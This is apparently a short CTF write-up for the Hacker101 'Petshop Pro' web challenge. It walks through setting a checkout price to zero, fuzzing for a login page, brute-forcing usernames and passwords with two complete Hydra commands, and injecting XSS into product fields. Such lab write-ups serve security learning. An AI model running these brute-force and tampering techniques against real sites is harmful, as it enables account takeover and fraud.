---
layout: post
title:  "Petshop Pro"
date:   2025-04-18 14:00:00 -0400
categories: HACKERONE-ctf web easy
tags: hackerone CTF writeup XSS hydra 
---

### CHALLENGE HINT
![](assets/img/hackerone/petshop-pro/1.png)

### Flag0
Read the hint, we see vulnerability at `check out` page, let add kitten and puppy in our cart and check out. Inspect it and change the value of price to 0.
![](assets/img/hackerone/petshop-pro/2.png)

### Flag1
Use `FUZZING` to find entrypoint and brute force credential.
![](assets/img/hackerone/petshop-pro/3.png)
![](assets/img/hackerone/petshop-pro/4.png)

Well, it took me lots of time to find the user name by `Turbo` in `BurpSuite`. We can also use `Hydra` to crack it.
```bash
hydra -L /usr/share/wordlists/seclists/Usernames/Names/names.txt -p 'asd' f1230b94c6dbbc207a455a3c6414a0fb.ctf.hacker101.com https-post-form "/login:username=^USER^&password=^PASS^:F=Invalid username" -t 64 -f
```
We have `username`, now we are looking for the `password`
```bash
hydra -l [username] -P rockyou.txt f1230b94c6dbbc207a455a3c6414a0fb.ctf.hacker101.com https-post-form "/login:username=^USER^&password=^PASS^:F=Invalid password" -t 64 -f
```
### Flag2
We inject `XSS` payload to `Edit page` at `Name` and `Description`, then go to check out!
